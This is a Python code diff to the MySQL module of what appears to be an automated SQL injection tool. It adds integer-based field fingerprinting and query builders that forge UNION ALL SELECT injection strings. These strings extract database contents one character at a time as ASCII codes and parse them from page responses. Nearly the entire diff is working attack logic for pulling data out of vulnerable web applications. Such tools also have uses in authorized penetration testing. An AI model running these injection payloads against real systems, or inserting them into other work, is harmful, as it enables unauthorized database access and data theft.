@@ -29,6 +29,10 @@ class MysqlMole(DbmsMole):
     out_delimiter = DbmsMole.to_hex(out_delimiter_result)
     inner_delimiter_result = "><"
     inner_delimiter = DbmsMole.to_hex(inner_delimiter_result)
+    integer_field_finger = 'ascii(0x3a) + (length(0x49494949494949) * 190) + (ascii(0x49) * 31337)'
+    integer_field_finger_result = '2288989'
+    integer_out_delimiter = '3133707'
+    
 
     @classmethod
     def to_string(cls, data):
@@ -72,12 +76,14 @@ class MysqlMole(DbmsMole):
     
     @classmethod
     def injectable_field_fingers(cls, query_columns, base):
-        hashes = []
+        hashes_str = []
+        hashes_int = []
         to_search = []
         for i in range(0, query_columns):
-            hashes.append(DbmsMole.to_hex(str(base + i)))
+            hashes_str.append(DbmsMole.to_hex(str(base + i)))
+            hashes_int.append(str(base + i))
             to_search.append(str(base + i))
-        return [FingerBase(hashes, to_search)]
+        return [MysqlFinger(hashes_str, to_search, True), MysqlFinger(hashes_int, to_search, False)]
     
     @classmethod
     def dbms_name(cls):
@@ -91,9 +97,19 @@ class MysqlMole(DbmsMole):
     def field_finger_query(cls, columns, finger, injectable_field):
         query = " and 1 = 0 UNION ALL SELECT "
         query_list = list(map(str, range(columns)))
-        query_list[injectable_field] = 'CONCAT(@@version,' + DbmsMole.to_hex(DbmsMole.field_finger_str) + ')'
+        if finger.is_string_query:
+            query_list[injectable_field] = 'CONCAT(@@version,' + DbmsMole.to_hex(DbmsMole.field_finger_str) + ')'
+        else:
+            query_list[injectable_field] = MysqlMole.integer_field_finger
         query += ",".join(query_list)
         return query
+
+    @classmethod
+    def field_finger(cls, finger):
+        if finger.is_string_query:
+            return DbmsMole.field_finger_str
+        else:
+            return MysqlMole.integer_field_finger_result
 
     @classmethod
     def dbms_check_blind_query(cls):
@@ -127,12 +143,47 @@ class MysqlMole(DbmsMole):
                      " limit 1 offset " + str(offset) + " "
         return query
 
+    def forge_integer_query(self, index, fields, table, where="1=1", offset=0):
+        if len(table) > 0:
+            table = ' from ' + table
+            where = ' where ' + where
+        else:
+            where = ' '
+        return (' and 1=0 union all select concat(' + MysqlMole.integer_out_delimiter + 
+               ',ascii(substring('+fields+', '+str(index)+', 1)), ' + MysqlMole.integer_out_delimiter + 
+               ')' + table+' ' + self.parse_condition(where) + ' limit 1 offset '+str(offset))
+
+    def forge_integer_len_query(self, field, table, where="1=1", offset=0):
+        if len(table) > 0:
+            table = ' from ' + table
+            where = ' where ' + where
+        else:
+            where = ' '
+        return (' and 1=0 union all select concat(' + MysqlMole.integer_out_delimiter + 
+               ',length('+field+'),' + MysqlMole.integer_out_delimiter+ ')' +table+' ' + 
+               self.parse_condition(where) + ' limit 1 offset '+str(offset))
+
+    def set_good_finger(self, finger):
+        self.finger = finger
+
     def parse_results(self, url_data):
-        data_list = url_data.split(MysqlMole.out_delimiter_result)
+        if self.finger.is_string_query:
+            data_list = url_data.split(MysqlMole.out_delimiter_result)
+        else:
+            data_list = url_data.split(MysqlMole.integer_out_delimiter)
         if len(data_list) < 3:
             return None
         data = data_list[1]
-        return data.split(MysqlMole.inner_delimiter_result)
+        if self.finger.is_string_query:
+            return data.split(MysqlMole.inner_delimiter_result)
+        else:
+            return data
     
     def __str__(self):
         return "Mysql Mole"
+
+
+class MysqlFinger(FingerBase):
+    def __init__(self, query, to_search, is_string_query):
+        FingerBase.__init__(self, query, to_search)
+        self.is_string_query = is_string_query
